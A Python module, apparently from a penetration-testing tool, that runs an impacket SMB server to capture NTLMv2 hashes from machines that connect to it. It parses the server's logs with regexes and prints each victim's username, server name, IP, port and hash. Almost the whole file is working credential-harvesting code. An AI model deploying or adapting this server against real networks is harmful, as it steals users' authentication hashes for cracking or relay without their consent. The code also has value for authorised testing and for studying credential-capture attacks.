from threading import Thread
from typing import List, Tuple
from impacket import smbserver
from io import StringIO
import logging
import sys

from scapy.utils import colgen
from .interceptlogging import InterceptHandler
from time import sleep
import re
from colorama import Fore, Style
from tabulate import tabulate


class SmbServer:
    def __init__(self, lhost: str, port: str, output=sys.stdout) -> None:
        self._lhost = lhost
        self._port = port
        self._output = output
        self._log_stream = StringIO()
        self._users_collected = []

        logging.basicConfig(handlers=[InterceptHandler()], level=0)
        console = logging.StreamHandler(self.log_stream)
        console.setLevel(logging.INFO)
        logging.getLogger("").addHandler(console)

    @property
    def users_collected(self) -> List[str]:
        return self._users_collected

    @users_collected.setter
    def users_collected(self, new_user: str):
        self._users_collected.append(new_user)

    @property
    def log_stream(self):
        return self._log_stream

    @property
    def lhost(self) -> str:
        return self._lhost

    @property
    def port(self) -> str:
        return self._port

    @property
    def output(self):
        return self._output

    @lhost.setter
    def iface(self, lhost: str) -> None:
        self._lhost = lhost

    @port.setter
    def port(self, port) -> None:
        self._port = port

    @output.setter
    def output(self, output) -> None:
        self._output = output

    @log_stream.setter
    def log_stream(self, stream: StringIO) -> None:
        self._log_stream = stream

    def user_info(self, i: int, user_info_matches: str) -> Tuple[str, str]:
        normalize_user_info = (
            user_info_matches[i].split()[1].replace("(", "").replace(")", "").split(",")
        )
        user = normalize_user_info[0]
        server_name = normalize_user_info[1]
        return user, server_name

    def connection_info(self, i: int, connection_info_matches: str) -> Tuple[str, str]:
        normalize_connection_info = (
            connection_info_matches[i]
            .split()[2]
            .replace("(", "")
            .replace(")", "")
            .split(",")
        )
        remote_ip = normalize_connection_info[0]
        remote_port = normalize_connection_info[1]
        return remote_ip, remote_port

    def color_output(self, word, color):
        return f"{color}{word}{Style.RESET_ALL}"

    def show_collected_info(
        self, i, ntlmv2_hash: str, user_info_matches: str, connection_info_matches: str
    ) -> None:
        user, server_name = self.user_info(i, user_info_matches)
        if user not in self.users_collected:
            remote_ip, remote_port = self.connection_info(i, connection_info_matches)
            self.users_collected = user
            print(
                f'{self.color_output("USER", Fore.BLUE)} : {self.color_output(user,Fore.YELLOW)}'
            )

            print(
                f'{self.color_output("Server Name", Fore.BLUE)} : {self.color_output(server_name,Fore.YELLOW)}'
            )

            print(
                f'{self.color_output("IP", Fore.BLUE)} : {self.color_output(remote_ip,Fore.YELLOW)}'
            )

            print(
                f'{self.color_output("Remote Port", Fore.BLUE)} : {self.color_output(remote_port,Fore.YELLOW)}'
            )

            print(
                f'{self.color_output("NTLMv2", Fore.BLUE)} : {self.color_output(ntlmv2_hash,Fore.YELLOW)}'
            )
        else:
            print(f"NTLMv2 hash of user {user} shown above")

    def generate_output(self):
        pattern_for_ntlmv2_hash = re.compile(r".*::.*")
        pattern_for_user_info = re.compile(r"AUTHENTICATE_MESSAGE .*")
        pattern_for_connection_info = re.compile(r"Incoming connection .*")

        ntlmv2_matches = pattern_for_ntlmv2_hash.findall(self.log_stream.getvalue())
        connection_info_matches = pattern_for_connection_info.findall(
            self.log_stream.getvalue()
        )
        user_info_matches = pattern_for_user_info.findall(self.log_stream.getvalue())

        for i, ntlmv2_hash in enumerate(ntlmv2_matches):
            self.show_collected_info(
                i, ntlmv2_hash, user_info_matches, connection_info_matches
            )

    def show_ntlmv2(self):
        while True:
            sleep(2)
            if self.log_stream.getvalue() != "":
                self.generate_output()
            self.log_stream.truncate(0)
            self.log_stream.seek(0)

    def start_smbserver(self) -> None:
        show_ntlmv2_thread = Thread(target=self.show_ntlmv2)
        show_ntlmv2_thread.daemon = True
        show_ntlmv2_thread.start()

        server = smbserver.SimpleSMBServer(
            listenAddress=self.lhost, listenPort=int(self.port)
        )
        server.setSMBChallenge("")
        server.start()
